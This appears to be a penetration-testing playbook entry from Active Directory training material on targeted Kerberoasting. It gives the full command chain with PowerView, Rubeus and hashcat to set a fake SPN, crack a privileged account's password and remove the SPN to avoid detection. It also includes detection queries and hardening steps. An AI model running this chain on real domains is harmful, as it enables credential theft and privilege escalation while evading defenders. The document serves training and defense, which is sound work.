name: PowerView - Targeted Kerberoast via GenericWrite
description: Abuses GenericWrite over a user account to temporarily set a fake SPN, making the account kerberoastable. Request the TGS ticket, crack it offline, then clean up the fake SPN. Used when you have GenericWrite on an account that doesn't already have an SPN but has a valuable password to crack.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== WHY SET A FAKE SPN? ===
Kerberoasting requires the target account to have a Service Principal Name (SPN).
If your target account (e.g., adunn - DA member) has no SPN, you can't directly
kerberoast them. But if you have GenericWrite over the account, you can SET a fake
SPN, making the account kerberoastable, then clean it up afterward.

The DC will encrypt a TGS for the fake service using adunn's NT hash - exactly
like a real kerberoast. Crack offline → DA password → game over.

=== FULL CHAIN ===
# 1. Check target account (no SPN currently)
Get-DomainUser -Identity adunn | select samaccountname,serviceprincipalname

# 2. Create cred for the GenericWrite holder (damundsen)
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# 3. Set fake SPN on target account
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='nonexistent/BLAH'} -Verbose

# 4. Verify SPN was set
Get-DomainUser -Identity adunn | select samaccountname,serviceprincipalname

# 5. Kerberoast the target
.\Rubeus.exe kerberoast /user:adunn /nowrap  (or GetUserSPNs.py with creds)

# 6. Crack the TGS with hashcat -m 13100
hashcat -m 13100 adunn.hash /usr/share/wordlists/rockyou.txt

# 7. CLEAN UP the fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

=== WHY CLEAN UP ===
A fake SPN on a user account is a clear indicator of compromise - security tools
and admins will notice. Always remove it immediately after capturing the hash.
If the account is a DA or admin and an admin notices the SPN, the engagement is
blow - clean up fast.

=== IMPORTANT: WHAT GETS ENCRYPTED ===
The TGS for the fake SPN is encrypted with the target's RC4 (or AES256) hash,
FIRST checking what encryption types the DC and account support. If AES is
enforced, hashcat mode 19700 is needed instead of 13100 - much harder.

references.title: HTB Academy - Active Directory Enumeration & Attacks

recommended.note: Roast the account now that it has an SPN.

defense.why_it_works: With GenericWrite over a target user, sets a temporary SPN, Kerberoasts the account to get a crackable hash, then removes the SPN (targeted Kerberoasting).
defense.prerequisites: GenericWrite (or write to servicePrincipalName) over the target user.
defense.impact: A crackable TGS hash for a user who had no SPN - cracking yields their password.
defense.detection: [MITRE T1558.003] Event 5136 (servicePrincipalName added to a user) by a non-admin, immediately followed by a 4769 TGS request for that user, then the SPN removed.
defense.artifacts: 5136 SPN add/remove; a 4769 for the target; the extracted hash.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address
| sort - _time

index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136
| where AttributeLDAPDisplayName="servicePrincipalName"
| table _time, SubjectUserName, ObjectDN, AttributeValue
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "servicePrincipalName"
| project TimeGenerated, Computer, SubjectUserName, ObjectDN, AttributeValue
| sort by TimeGenerated desc
// SPN added then removed around a 4769 TGS request for the same user
defense.prevention: Audit write access to servicePrincipalName; alert on SPN changes on user accounts correlated with 4769; strong passwords defeat the crack.
defense.evasion: Remove the SPN immediately after roasting; RC4 downgrade keeps the ticket crackable.
defense.misconfiguration: Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.
defense.vulnerable_config:
# Example: a help-desk group has ForceChangePassword on Domain Admins members
# Found via BloodHound 'ForceChangePassword' edge, or PowerView:
Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |
  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType

# Another dangerous pattern - GenericWrite on a user (enables targeted Kerberoasting):
Get-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}
defense.secure_config:
# 1. Run AD ACL audit quarterly (automated):
# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users
# PowerView batch:
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |
  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |
  Export-Csv acl_review.csv

# 2. Remove dangerous ACEs:
Remove-DomainObjectAcl -TargetIdentity 'svc_sql' \
    -PrincipalIdentity 'helpdesk' -Rights GenericWrite

# 3. Enable AD Protected Users group for privileged accounts
# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius

steps.label: Set a fake SPN on the target

explain:
Turns GenericWrite over a user into that user's password by planting a temporary SPN:
  Set-DomainObject         PowerView attribute writer
  -Credential $Cred        act as the account holding the write right
  -Identity <target>       the SPN-less victim user
  -SET @{serviceprincipalname='nonexistent/BLAH'}   add a fake SPN so the account becomes Kerberoastable
  -Verbose                  show the result
Roast it (Rubeus kerberoast /user:<target>), crack the hash (hashcat -m 13100), then -Clear serviceprincipalname to clean up.
